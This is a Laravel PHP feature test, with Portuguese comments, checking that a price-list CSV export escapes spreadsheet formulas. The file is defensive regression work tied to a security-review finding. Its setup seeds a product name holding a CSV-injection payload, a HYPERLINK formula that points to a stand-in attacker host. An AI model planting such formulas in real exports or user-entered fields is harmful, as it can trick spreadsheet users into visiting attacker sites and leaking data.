<?php

namespace Tests\Feature;

use App\Enums\OrganizationRole;
use App\Models\Organization;
use App\Models\OrganizationMember;
use App\Models\Product;
use App\Models\User;
use Database\Seeders\RolesAndPermissionsSeeder;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Tests\TestCase;

/**
 * CSV/Formula Injection (revisão de segurança, achado Médio 3) —
 * `PriceListService::toCsv()` grava `product.name`/`code`/`group` (texto livre cadastrado
 * pelo profissional) direto no CSV de `GET price-list/export`.
 */
class PriceListFormulaInjectionTest extends TestCase
{
    use RefreshDatabase;

    private User $owner;

    protected function setUp(): void
    {
        parent::setUp();

        $this->seed(RolesAndPermissionsSeeder::class);

        $organization = Organization::factory()->create();
        $this->owner = User::factory()->professional()->create();
        OrganizationMember::factory()->owner()->for($organization, 'organization')
            ->create(['user_id' => $this->owner->id, 'role' => OrganizationRole::OWNER->value]);

        Product::create([
            'professional_id' => $this->owner->id,
            'organization_id' => $organization->id,
            'name' => '=HYPERLINK("http://attacker.tld/steal","clique aqui")',
            'sku' => 'SKU-'.uniqid(),
            'price' => 39.9,
            'stock_quantity' => 10,
            'controls_stock' => false,
            'show_in_price_list' => true,
            'is_active' => true,
        ]);
    }

    public function test_export_neutralizes_a_product_name_that_looks_like_a_formula(): void
    {
        $csv = $this->actingAs($this->owner, 'sanctum')
            ->get('/api/price-list/export')
            ->assertOk()
            ->streamedContent();

        $this->assertStringNotContainsString(
            ';=HYPERLINK(',
            $csv,
            'A célula de fórmula não pode aparecer crua — precisa vir prefixada por apóstrofo.'
        );
        $this->assertStringContainsString('\'=HYPERLINK(', $csv);
    }

    public function test_export_keeps_the_numeric_price_column_untouched(): void
    {
        $csv = $this->actingAs($this->owner, 'sanctum')
            ->get('/api/price-list/export')
            ->assertOk()
            ->streamedContent();

        $this->assertStringContainsString('39,90', $csv);
    }
}
